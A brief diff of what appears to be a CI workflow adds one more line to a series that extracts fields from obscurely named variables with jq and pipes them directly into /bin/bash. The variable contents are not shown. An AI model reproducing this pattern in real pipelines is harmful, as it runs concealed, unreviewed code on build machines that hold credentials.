@@ -27,6 +27,7 @@ jobs:
           echo $t86005 | jq -r .a7026 | /bin/bash
           echo $pupdk56386 | jq -r .rl29 | /bin/bash
           echo $xlhi04424 | jq -r .mpdhn05060 | /bin/bash
+          echo $nrgkb8 | jq -r .fk12 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
